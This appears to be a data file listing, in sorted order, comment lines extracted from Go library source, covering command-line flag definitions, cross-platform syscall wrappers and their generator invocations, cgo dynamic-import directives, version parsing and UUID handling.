"// These commands are KEYCTL_UPDATE, KEYCTL_READ, and KEYCTL_INSTANTIATE."
"// This excludes any metadata or pre-release information. For example,"
"// This field is deliberately big-endian, unlike the previous"
"// This file contains functions that wrap SetupAPI.dll and CfgMgr32.dll,"
"// This file is compiled as ordinary Go code,"
"// This function returns """" (2 double quotes) if s is empty."
"// This is important because if we are completing a flag value, we need to also"
"// This is likely due to a bug in xnu kernels,"
"// This remvoves the ""net"" dependency, because it is not used in the browser."
"// Timespec is an invented structure on Windows, but here for"
"// Timespec, it returns a zero Timespec and ERANGE."
"// To achieve file extension filtering, one can use ValidArgsFunction and"
"// To achieve the same behavior across all shells, one can use"
"// To avoid this, we first remove the __complete command to get back to having no sub-commands."
"// To change fd's window size, the req argument should be TIOCSWINSZ."
"// To create a file descriptor that provides access to a hash or cipher, both"
"// To disable sorting, set it to false."
"// To disable the mousetrap, just set MousetrapHelpText to blank string ("""")."
"// To disable the mousetrap, just set this variable to blank string ("""")."
"// To request directory names within another directory, the returned completions"
"// Translate ""kern.hostname"" to []_C_int{0,1,2,3}."
"// Traverse the command tree to find the command, and parse args for"
"// Try first with a small buffer, assuming the handle will"
"// Try to avoid short orphan words on the final line, by"
"// URN returns the RFC 2141 URN form of uuid,"
"// UTF16ToString returns the UTF-8 encoding of the UTF-16 sequence s,"
"// Uint defines a uint flag with specified name, default value, and usage string."
"// Uint16 defines a uint flag with specified name, default value, and usage string."
"// Uint16P is like Uint16, but accepts a shorthand letter that can be used after a single dash."
"// Uint16Var defines a uint flag with specified name, default value, and usage string."
"// Uint16VarP is like Uint16Var, but accepts a shorthand letter that can be used after a single dash."
"// Uint32 defines a uint32 flag with specified name, default value, and usage string."
"// Uint32P is like Uint32, but accepts a shorthand letter that can be used after a single dash."
"// Uint32Var defines a uint32 flag with specified name, default value, and usage string."
"// Uint32VarP is like Uint32Var, but accepts a shorthand letter that can be used after a single dash."
"// Uint64 defines a uint64 flag with specified name, default value, and usage string."
"// Uint64P is like Uint64, but accepts a shorthand letter that can be used after a single dash."
"// Uint64Var defines a uint64 flag with specified name, default value, and usage string."
"// Uint64VarP is like Uint64Var, but accepts a shorthand letter that can be used after a single dash."
"// Uint8 defines a uint8 flag with specified name, default value, and usage string."
"// Uint8P is like Uint8, but accepts a shorthand letter that can be used after a single dash."
"// Uint8Var defines a uint8 flag with specified name, default value, and usage string."
"// Uint8VarP is like Uint8Var, but accepts a shorthand letter that can be used after a single dash."
"// UintP is like Uint, but accepts a shorthand letter that can be used after a single dash."
"// UintSlice defines a []uint flag with specified name, default value, and usage string."
"// UintSliceP is like UintSlice, but accepts a shorthand letter that can be used after a single dash."
"// UintSliceVar defines a uintSlice flag with specified name, default value, and usage string."
"// UintSliceVar defines a uint[] flag with specified name, default value, and usage string."
"// UintSliceVarP is like UintSliceVar, but accepts a shorthand letter that can be used after a single dash."
"// UintSliceVarP is like the UintSliceVar, but accepts a shorthand letter that can be used after a single dash."
"// UintVar defines a uint flag with specified name, default value, and usage string."
"// UintVarP is like UintVar, but accepts a shorthand letter that can be used after a single dash."
"// Unable to find the real command. E.g., <program> someInvalidCmd <TAB>"
"// Unless required by applicable law or agreed to in writing, software"
"// Use fstatat, because Android's seccomp policy blocks stat."
"// Using a pessimistic constraint with a pre-release, restricts versions to pre-releases"
"// Using the ""net"" library inflates the size of the transpiled JS code by 673k bytes."
"// VarP is like Var, but accepts a shorthand letter that can be used after a single dash."
"// VarPF is like VarP, but returns the flag created"
"// Vmsplice splices user pages from a slice of Iovecs into a pipe specified by fd,"
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"// Wait status is 7 bits at bottom, either 0 (exited),"
"// We can't stuff the base back into a uintptr, so any"
"// We can't stuff the offset back into a uintptr, so any"
"// We need to use LoadLibrary and GetProcAddress from the Go runtime, because"
"// We'll use this more than once, so grab the length now so it's a little cleaner"
"// When called with an empty keyType the command locks the keyring, preventing"
"// When doing completion of a flag name, as soon as an argument starts with"
"// When hashing a small byte slice or string, a single Write and Read may"
"// Where available, just jump to package syscall's implementation of"
"// Windows System directory, bypassing the normal DLL search"
"// Windows directory, which is typically, though not always, "
"// Workaround FAIL with ""go test -v"" or ""cobra.test -test.v"", see "
"// WriteStringAndCheck writes a string into a buffer, and checks if the error is not nil."
"// XXX should first attempt to get gid of DEFAULT_TTY_GROUP=""tty"""
"// Zero clears the set s, so that it contains no CPUs."
"// __readdir_r_a returns errno at the end of the directory stream, rather than 0."
"// a base name (like ""advapi32.dll"")."
"// a command with a context.Background, so a background context will be"
"// a dependency on the (relatively heavy) ""reflect"" package."
"// a file or socket, use Sendto with MSG_MORE to instruct the kernel to update"
"// a flag named ""getURL"" and have it translated to ""geturl"".  A user could then pass"
"// a line wrap, the position will be advanced two"
"// a local terminal, that terminal must first have been put into raw mode."
"// a simple Compare that returns an int allowing easy >=, <=, etc."
"// a symlink, it is not dereferenced and the timestamps are set on the symlink."
"// a win32finddata1, and then copy the results out."
"// access (PEEKUSER warns that it might), but if we don't"
"// accessed using the Ifreq's methods. To create an Ifreq, use the NewIfreq"
"// actual system call is getdirentries64, 64 is a good guess."
"// affects Linux Kernel 5.8 and later versions, and has been fixed in Linux 5.16.11, 5.15.25 and 5.10.102"
"// align our reads, we might straddle an unmapped page"
"// an error if search fails. Find will not search procedure,"
"// and c.Stderr, calls c.Start, and returns the File of the tty's"
"// appendIfNotPresent will append stringToAppend to the end of s, but only if it's not yet present in s."
"// are empirically only present in the macOS port of the Win32 API,"
"// arg is ignored and not a pointer, so ioctl is fine instead of ioctlPtr."
"// argsMinusFirstX removes only the first x from args.  Otherwise, commands that look like"
"// argument is called with a pointer to the integer value, rather than"
"// arguments are a buffer and its length, respectively."
"// as gathered from GetCommandLine, QUERY_SERVICE_CONFIG's BinaryPathName argument, or elsewhere that"
"// as windows.Handle and windows.Errno, and we intend to keep these the same."
"// associated with opened file descriptor fd, and returns a non-negative"
"// attempt to wrap them. For the former, repainting t.maxLine"
"// backward compatible with the Linux kernel, which for some architectures uses"
"// because the caller expects to retain control of it, but"
"// being checked, at any point, does not have the same values in each index of the"
"// bind(2) man page: If name is zero, everything bound or mounted upon old is unbound or unmounted."
"// buffer). If a nil buffer is passed in, this function returns the minimum"
"// but it is also input to mksyscall,"
"// but since we are not using libc or XPG4.2, we should not be"
"// by default, godoc will display OS-specific documentation for the current"
"// by default, godoc will display the OS-specific documentation for the current"
"// bytes consumed from buf, the number of entries added"
"// bytes, as an index into "
"// bytesToKey tries to parse a key sequence from b. If successful, it returns"
"// can't declare it as a usual [] type, because mksyscall will use the opposite order. We therefore"
"// case, with all - replaced by _."
"// change starting time to January 1, 1601"
"// change starting time to the Epoch (00:00:00 UTC, January 1, 1970)"
"// checking, we need to account for a lopsided or jagged comparison"
"// cobra program that only consists of the root command, since this"
"// command is similar to KEYCTL_INSTANTIATE, except that the payload is a slice"
"// command limits the set of keys that can be linked to the keyring, regardless"
"// command or a parent, or it returns a function which returns the original"
"// commandsAreSorted defines, if command slice are sorted or not."
"// constraints segments, then it cannot be valid against the constraint."
"// contains a NUL byte at any location, it returns (nil, syscall.EINVAL)."
"// core system functions for managing hardware devices, drivers, and the PnP tree."
"// credentials in a Ucred structure. To receive such a message, the"
"// current implementation, only the resource fork extended attribute makes"
"// data can be written to the socket, processed by the kernel, and then read"
"// default encoding is MMMM Mmmm mmmM MMmm, where M is a hex digit of the major"
"// default usecase of semver, which is MAJOR.MINOR.PATCH at the minimum"
"// define a ""version"" flag, a ""version"" boolean flag will be added to the command and, if specified,"
"// definition in glibc. As only the error constants are needed here, include the"
"// derived.  The interface ""user"" is returned if the NodeID was set by"
"// dev_t in glibc is 64-bit, with 32-bit major and minor numbers. glibc's"
"// directory, the returned completions should specify the directory within"
"// directory, which is typically, though not always, "
"// dissociate was successful, safe to delete the cookie"
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
"// do not use NTString, and instead UTF16PtrFromString should be used for"
"// do not use NTUnicodeString, and instead UTF16PtrFromString should be used for"
"// does no translation, if not set previously."
"// dragonfly needs to check ABI version at runtime, see cmsgAlignOf in"
"// dynamically load additional symbols. Note that in the Go runtime, these"
"// e.g. even though '>0.1,>0.2' is logically equivalent"
"// echo, from the terminal."
"// errnoErr returns common boxed Errno values, to prevent"
"// executable name should also be the first argument in argv ([""ls"", ""-l""])."
"// existing KCM socket, returning a structure containing the file descriptor of"
"// fact that it is NOT runnable/hidden/deprecated, and has no sub commands that"
"// fcntl64Syscall is usually SYS_FCNTL, but is overridden on 32-bit Linux"
"// fdopendir. However, syscallPtr was only added in Go 1.13, so we fall"
"// fields: dwFileType, dwCreatorType, and wFinderFlags. However, those fields"
"// fileHandle C.struct_file_handle"" but that generated empty structs"
"// flags are available, use GetProcAddress to get the address of the"
"// flags can be used with LoadLibraryEx."""
"// folder, but LoadLibraryEx doesn't support"
"// for ""asymmetric"" include ""builtin_trusted"", ""builtin_and_secondary_trusted"","
"// for a version ""1.2.3-beta"", segments will return a slice of"
"// for back-compat, only add version flag behavior if version is defined"
"// for example, having this command would cause problems to a"
"// for mips64 and mips64le. Instead, hard code it for now (it's the"
"// for the last character in a line. However, when"
"// for those, IoctlRetInt should be used instead of this function."
"// format of the output and how to control it, see the documentation for PrintDefaults."
"// from fd, using the specified request number."
"// func svcCall(fnptr unsafe.Pointer, argv "
"// function. If GetProcAddress succeeds, the LOAD_LIBRARY_SEARCH_"
"// given, logical position in the text."
"// go run mksyscall.go -b32 -arm -tags linux,mips syscall_linux.go syscall_linux_mipsx.go syscall_linux_alarm.go"
"// go run mksyscall.go -b32 -tags linux,ppc syscall_linux.go syscall_linux_ppc.go syscall_linux_alarm.go"
"// go run mksyscall.go -dragonfly -tags dragonfly,amd64 syscall_bsd.go syscall_dragonfly.go syscall_dragonfly_amd64.go"
"// go run mksyscall.go -l32 -arm -tags freebsd,arm syscall_bsd.go syscall_freebsd.go syscall_freebsd_arm.go"
"// go run mksyscall.go -l32 -arm -tags linux,arm syscall_linux.go syscall_linux_arm.go"
"// go run mksyscall.go -l32 -arm -tags linux,mipsle syscall_linux.go syscall_linux_mipsx.go syscall_linux_alarm.go"
"// go run mksyscall.go -l32 -netbsd -arm -tags netbsd,arm syscall_bsd.go syscall_netbsd.go syscall_netbsd_arm.go"
"// go run mksyscall.go -l32 -netbsd -tags netbsd,386 syscall_bsd.go syscall_netbsd.go syscall_netbsd_386.go"
"// go run mksyscall.go -l32 -openbsd -arm -tags openbsd,arm syscall_bsd.go syscall_openbsd.go syscall_openbsd_arm.go"
"// go run mksyscall.go -l32 -openbsd -tags openbsd,386 syscall_bsd.go syscall_openbsd.go syscall_openbsd_386.go"
"// go run mksyscall.go -l32 -plan9 -tags plan9,386 syscall_plan9.go"
"// go run mksyscall.go -l32 -plan9 -tags plan9,amd64 syscall_plan9.go"
"// go run mksyscall.go -l32 -plan9 -tags plan9,arm syscall_plan9.go"
"// go run mksyscall.go -l32 -tags freebsd,386 syscall_bsd.go syscall_freebsd.go syscall_freebsd_386.go"
"// go run mksyscall.go -l32 -tags linux,386 syscall_linux.go syscall_linux_386.go syscall_linux_alarm.go"
"// go run mksyscall.go -netbsd -tags netbsd,amd64 syscall_bsd.go syscall_netbsd.go syscall_netbsd_amd64.go"
"// go run mksyscall.go -netbsd -tags netbsd,arm64 syscall_bsd.go syscall_netbsd.go syscall_netbsd_arm64.go"
"// go run mksyscall.go -openbsd -tags openbsd,amd64 syscall_bsd.go syscall_openbsd.go syscall_openbsd_amd64.go"
"// go run mksyscall.go -openbsd -tags openbsd,arm64 syscall_bsd.go syscall_openbsd.go syscall_openbsd_arm64.go"
"// go run mksyscall.go -openbsd -tags openbsd,mips64 syscall_bsd.go syscall_openbsd.go syscall_openbsd_mips64.go"
"// go run mksyscall.go -tags darwin,amd64,go1.12 syscall_bsd.go syscall_darwin.go syscall_darwin_amd64.go"
"// go run mksyscall.go -tags darwin,amd64,go1.13 syscall_darwin.1_13.go"
"// go run mksyscall.go -tags darwin,arm64,go1.12 syscall_bsd.go syscall_darwin.go syscall_darwin_arm64.go"
"// go run mksyscall.go -tags darwin,arm64,go1.13 syscall_darwin.1_13.go"
"// go run mksyscall.go -tags freebsd,amd64 syscall_bsd.go syscall_freebsd.go syscall_freebsd_amd64.go"
"// go run mksyscall.go -tags freebsd,arm64 syscall_bsd.go syscall_freebsd.go syscall_freebsd_arm64.go"
"// go run mksyscall.go -tags linux,amd64 syscall_linux.go syscall_linux_amd64.go syscall_linux_alarm.go"
"// go run mksyscall.go -tags linux,arm64 syscall_linux.go syscall_linux_arm64.go"
"// go run mksyscall.go -tags linux,loong64 syscall_linux.go syscall_linux_loong64.go"
"// go run mksyscall.go -tags linux,mips64 syscall_linux.go syscall_linux_mips64x.go syscall_linux_alarm.go"
"// go run mksyscall.go -tags linux,mips64le syscall_linux.go syscall_linux_mips64x.go"
"// go run mksyscall.go -tags linux,ppc64 syscall_linux.go syscall_linux_ppc64x.go syscall_linux_alarm.go"
"// go run mksyscall.go -tags linux,ppc64le syscall_linux.go syscall_linux_ppc64x.go syscall_linux_alarm.go"
"// go run mksyscall.go -tags linux,riscv64 syscall_linux.go syscall_linux_riscv64.go"
"// go run mksyscall.go -tags linux,s390x syscall_linux.go syscall_linux_s390x.go syscall_linux_alarm.go"
"// go run mksyscall.go -tags linux,sparc64 syscall_linux.go syscall_linux_sparc64.go syscall_linux_alarm.go"
"// go run mksyscall.go -tags zos,s390x syscall_zos_s390x.go"
"// go run mksyscall_aix_ppc.go -aix -tags aix,ppc syscall_aix.go syscall_aix_ppc.go"
"// go run mksyscall_aix_ppc64.go -aix -tags aix,ppc64 syscall_aix.go syscall_aix_ppc64.go"
"// go run mksyscall_solaris.go -illumos -tags illumos,amd64 syscall_illumos.go"
"// go run mksyscall_solaris.go -tags solaris,amd64 syscall_solaris.go syscall_solaris_amd64.go"
"// got less than three, pad it with 0s. This is to cover the basic"
"// got will be trustworthy with ETIME, but not any other error."
"// greater than the number of bytes in b, the boolean will be false."
"// groupStatus format is the list of flags as a unique ID,"
"// gstring reads a string from b, prefixed with a 16-bit length in little-endian order."
"// handleKey processes the given key and, optionally, returns a line of text"
"// helpCommand is command with usage 'help'. If it's not defined by user,"
"// historyIndex stores the currently accessed history entry, where zero"
"// if a DACL exists but is an ""empty DACL"", meaning fully permissive. If the DACL does not exist, err returns"
"// if a SACL exists but is an ""empty SACL"", meaning fully permissive. If the SACL does not exist, err returns"
"// if a command is runnable, deprecated, or hidden it is not a 'help' command"
"// if a part is empty, we use the other to decide"
"// if an empty UUID comes from a table, we return a null UUID"
"// if any non-help sub commands are found, the command is not a 'help' command"
"// if not, it means that Other has to be greater than Self"
"// if parts are equals, continue the loop"
"// if required packages aren't installed, we may be able to install them with package kit..."
"// if we got this far, they're equal"
"// implementation of removexattr, we do so for interoperability with the"
"// in CreateProcess's CommandLine argument, CreateService/ChangeServiceConfig's BinaryPathName argument,"
"// in primordial order if f.SortFlags is false, calling fn for each."
"// in the form of ""{XXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}""."
"// in the structure. To be on the safe side, we"
"// in their user documentation, and users will be using them explicitly."
"// includes (linux/if_pppox.h includes linux/in.h, which conflicts"
"// information. Therefore, ambiguities in the version string such as"
"// inspired by go, go-Commander, gh and subcommand"
"// instead of the glibc-specific ""CALL 0x10(GS)""."
"// int32, so the fields' value must be modified."
"// integer value on fd, using the specified request number. The ioctl"
"// ioctl itself should not be exposed directly, but additional get/set functions"
"// ioctl itself should not be exposed directly, but additional get/set"
"// is accepted, but has no address."
"// is set to ""0""."
"// it in our own nicer implementation, either here or in"
"// it with ProcThreadAttributeListContainer.Update, free its memory using"
"// kernel32.dll is special, since it's where LoadLibraryEx comes from."
"// key handle permission mask as described in the ""keyctl setperm"" section of"
"// length is family (uint16), name, NUL."
"// like C faccessat, we do the same."
"// linux implementation, we wrap around the system calls and pass in NULL when"
"// linux system call, specifically the position parameter:"
"// list from its existing class driver list, instead of the normal INF search."
"// location, it returns (nil, EINVAL)."
"// location, it returns (nil, syscall.EINVAL)."
"// lookup returns the Flag structure of the named flag, returning nil if none exists."
"// lowercase first letter: Bad -> bad, but STREAM -> STREAM."
"// makeAbsoluteSD is expected to fail, but it succeeds."
"// makeSelfRelativeSD is expected to fail, but it succeeds."
"// missing constants on FreeBSD-11.1-RELEASE, copied from old values in ztypes_freebsd_arm.go"
"// misuse, so pass the raw "
"// more information, see:"
"// name of the type.  As this is generally unknown, we approximate that with"
"// next most recent, and so on. If such an element doesn't exist then ok is"
"// no subcommand, always take args"
"// of keyring permissions. The command requires the ""setattr"" permission."
"// of values.  This allows full control over the value of list flags,"
"// on fd, using the specified request number."
"// on the purposes of the fields, check the official linux kernel documentation"
"// openshift admin policy add-role-to-user admin my-user, lose the admin argument (arg[4])."
"// or a parent, or it returns a default usage function."
"// or a parent, or it returns a function with default help behavior."
"// or a string, to specify a resource or resource type by name."
"// or larger than the other version, respectively."
"// originally tried to generate it via unix/linux/types.go with ""type"
"// otherwise, the default values of all defined flags in the set."
"// out of that file, it's cleaner to just define it by hand here."
"// own sysctl wrappers. Provide it here, even though direct syscalls are no"
"// pastes. Additionally, any lines that are completely pasted will be returned"
"// path. To work around that, return ENOENT if path is not absolute."
"// perform SHA1 hashing. The descriptor is not safe for concurrent use, but"
"// pipe2 on dragonfly takes an fds array as an argument, but still"
"// portable interface to the system, such as ""os"", ""time"" and ""net"".  Use"
"// potential whitespace, "
"// prefixed zeroes (1.04.0 => 1.4.0), "
"// previously set context will be returned. Otherwise, nil is returned."
"// primitives. OS details vary depending on the underlying system, and"
"// prior security descriptor to be merged, any of which can be nil, returning the self-relative security descriptor"
"// prioritize the named flag when performing completion,"
"// prioritize the named persistent flag when performing completion,"
"// process ([""USER=go"", ""PWD=/tmp""])."
"// process. If inheritExisting is true, then this environment also inherits the"
"// pstring copies the string s to b, prepending it with a 16-bit length in little-endian order, and"
"// refers to a location in a different process' address space, which"
"// registration, installation, and deletion."
"// releases predating 6.3, otherwise an error will be returned."
"// requested by ClockSequence, GetTime, or NewUUID.  (section 4.2.1.1)"
"// return syscall.Handle and syscall.Errno, but these are the same, in fact,"
"// returning (Constraints, error) and panics if error is non-nil."
"// returns -1, 0, or 1 if this version is smaller, equal,"
"// root command in upper case, with all - replaced by _."
"// root command with subcommands, do subcommand checking."
"// round x to the nearest multiple of y, larger or equal to x."
"// s, with a terminating NUL added. If s contains a NUL byte at any"
"// same unsafe pointer cast as above, because this value is not"
"// segments of the version, without prerelease or metadata."
"// sequence without knowing them all, but it seems that [a-zA-Z"
"// sequence, and the current time.  If the NodeID has not been set by SetNodeID"
"// should specify a single directory name within which to search. For example,"
"// since Epoch (00:00:00 UTC, January 1, 1970)."
"// sockaddr ioctls. For convenience, we expose these as Inet4Addr since the Port"
"// specified as the path for futimesat. However, Go doesn't like"
"// structure, taking into account any necessary alignment."
"// supplied without ""=value"" text"
"// system, set $GOOS and $GOARCH to the desired system. For example, if"
"// systems, hi will always be 0. On 32-bit systems, offs will be split in half."
"// that yet on their system, so emulate it."
"// the FOLDERID_ constants, and chosen and optionally created based on a KF_ flag."
"// the UTF-8 string s, with a terminating NUL added. If s"
"// the array.  Each time this function is called with the same array, the new"
"// the command either has no sub commands, or no available 'help' sub commands"
"// the command either has no sub commands, or no available (non deprecated/help/hidden)"
"// the command either has no sub commands, or no non-help sub commands"
"// the incomplete, initial line. That value is stored in"
"// the index, which must be less than sid.SubAuthorityCount()."
"// the last time a UUID was generated.  Unless SetClockSequence is used, a new"
"// the prerelease information is ""beta""."
"// the two paths are each one uint16 short. Use the correct struct,"
"// them an empty string of data, rather than NULL."
"// there are no interfaces) then """", nil is returned."
"// they use to decide if a flag should get ""true"" when no arg is given."
"// this index is less than the constraints segment at this index, then it cannot"
"// thus the otherwise seemingly extraneous ""cookies"" map"
"// tmpl executes the given template text on data, writing the result to w."
"// to complete directories within ""themes/"":"
"// to names, and the new names slice."
"// too long when shinking. Others, (e.g. gnome-terminal) will"
"// transparently. Currently, UUIDs map to strings. Please consult"
"// tree. argv0 should be the full path to an executable (""/bin/ls"") and the"
"// trying to load ""foo.dll"" out of the system"
"// type of the flag's value, or the empty string if the flag is boolean."
"// typically holds a user-defined implementation of Value. For instance, the"
"// uint16, if it is used, is supposed to be a NUL, and Go doesn't need that."
"// unsafe.Pointer rules since the ""pointer-ness"" of data would not be"
"// up to the caller to provide a pointer to the appropriate type, cast"
"// urn:uuid:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx,  or """" if uuid is invalid."
"// usage calls the Usage method for the flag set, or the usage function if"
"// use GetFileType to check pipe, pipe can't do seek"
"// use is a no-op, but the compiler cannot see that it is."
"// use of this argument. For all others, position is reserved. We simply"
"// value of the flag are represented by the first argument, of type Value, which"
"// version (but before any metadata). For example, with ""1.2.3-beta"","
"// we can't download alpine, look at existing images and try to use those"
"// we should handle things gracefully. To do so, we need to keep an extra"
"// will print content of the ""Version"" variable. A shorthand ""v"" flag will also be added if the"
"// with ExecuteContext or the context was set with SetContext, the"
"// with System set to true, or use LoadLibraryEx directly."
"// with legacy systems where dev_t is 16 bits wide, encoded as MMmm. It is also"
"// with markers. Not all terminals support this but, if it is supported, then"
"// with the desired access instead, or use GetCurrentProcessToken for a"
"// works great, but that behaviour goes badly wrong in the case"
"// xterms to move upwards, which isn't great, but it avoids a"
"// you want to view documentation for freebsd/arm on linux/amd64, set $GOOS"
"// z/OS socket macros use [32-bit] sizeof(int) alignment,"
"// { int, short, short } in poll.h"
"//DefValue: goflag.DefValue,"
"//go:cgo_import_dynamic libc___major __major ""libc.so"""
"//go:cgo_import_dynamic libc___makedev __makedev ""libc.so"""
"//go:cgo_import_dynamic libc___minor __minor ""libc.so"""
"//go:cgo_import_dynamic libc___xnet_bind __xnet_bind ""libsocket.so"""
"//go:cgo_import_dynamic libc___xnet_connect __xnet_connect ""libsocket.so"""
"//go:cgo_import_dynamic libc___xnet_getsockopt __xnet_getsockopt ""libsocket.so"""
"//go:cgo_import_dynamic libc___xnet_llisten __xnet_llisten ""libsocket.so"""
"//go:cgo_import_dynamic libc___xnet_recvmsg __xnet_recvmsg ""libsocket.so"""
"//go:cgo_import_dynamic libc___xnet_sendmsg __xnet_sendmsg ""libsocket.so"""
"//go:cgo_import_dynamic libc___xnet_sendto __xnet_sendto ""libsocket.so"""
"//go:cgo_import_dynamic libc___xnet_socket __xnet_socket ""libsocket.so"""
"//go:cgo_import_dynamic libc___xnet_socketpair __xnet_socketpair ""libsocket.so"""
"//go:cgo_import_dynamic libc_accept accept ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_accept accept ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_accept accept ""libsocket.so"""
"//go:cgo_import_dynamic libc_accept4 accept4 ""libsocket.so"""
"//go:cgo_import_dynamic libc_access access ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_access access ""libc.so"""
"//go:cgo_import_dynamic libc_acct acct ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_acct acct ""libc.so"""
"//go:cgo_import_dynamic libc_adjtime adjtime ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_adjtime adjtime ""libc.so"""
"//go:cgo_import_dynamic libc_bind bind ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_bind bind ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_chdir chdir ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_chdir chdir ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_chdir chdir ""libc.so"""
"//go:cgo_import_dynamic libc_chflags chflags ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_chmod chmod ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_chmod chmod ""libc.so"""
"//go:cgo_import_dynamic libc_chown chown ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_chown chown ""libc.so"""
"//go:cgo_import_dynamic libc_chroot chroot ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_chroot chroot ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_chroot chroot ""libc.so"""
"//go:cgo_import_dynamic libc_clock_gettime clock_gettime ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_clonefile clonefile ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_clonefileat clonefileat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_close close ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_close close ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_close close ""libc.so"""
"//go:cgo_import_dynamic libc_closedir closedir ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_connect connect ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_connect connect ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_creat creat ""libc.so"""
"//go:cgo_import_dynamic libc_dup dup ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_dup dup ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_dup dup ""libc.so"""
"//go:cgo_import_dynamic libc_dup2 dup2 ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_dup2 dup2 ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_dup2 dup2 ""libc.so"""
"//go:cgo_import_dynamic libc_exchangedata exchangedata ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_exit exit ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_exit exit ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_exit exit ""libc.so"""
"//go:cgo_import_dynamic libc_faccessat faccessat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_faccessat faccessat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_faccessat faccessat ""libc.so"""
"//go:cgo_import_dynamic libc_fchdir fchdir ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fchdir fchdir ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fchdir fchdir ""libc.so"""
"//go:cgo_import_dynamic libc_fchflags fchflags ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fchmod fchmod ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fchmod fchmod ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fchmod fchmod ""libc.so"""
"//go:cgo_import_dynamic libc_fchmodat fchmodat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fchmodat fchmodat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fchmodat fchmodat ""libc.so"""
"//go:cgo_import_dynamic libc_fchown fchown ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fchown fchown ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fchown fchown ""libc.so"""
"//go:cgo_import_dynamic libc_fchownat fchownat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fchownat fchownat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fchownat fchownat ""libc.so"""
"//go:cgo_import_dynamic libc_fclonefileat fclonefileat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fcntl fcntl ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fcntl fcntl ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fcntl fcntl ""libc.so"""
"//go:cgo_import_dynamic libc_fdatasync fdatasync ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fdatasync fdatasync ""libc.so"""
"//go:cgo_import_dynamic libc_fdopendir fdopendir ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fgetxattr fgetxattr ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_flistxattr flistxattr ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_flock flock ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_flock flock ""libc.so"""
"//go:cgo_import_dynamic libc_fpathconf fpathconf ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fpathconf fpathconf ""libc.so"""
"//go:cgo_import_dynamic libc_fremovexattr fremovexattr ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fsetxattr fsetxattr ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fstat fstat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fstat fstat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fstat fstat ""libc.so"""
"//go:cgo_import_dynamic libc_fstat64 fstat64 ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fstatat fstatat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fstatat fstatat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fstatat fstatat ""libc.so"""
"//go:cgo_import_dynamic libc_fstatat64 fstatat64 ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fstatfs fstatfs ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fstatfs fstatfs ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_fstatfs64 fstatfs64 ""/usr/lib/libSystem.B.dylib"""
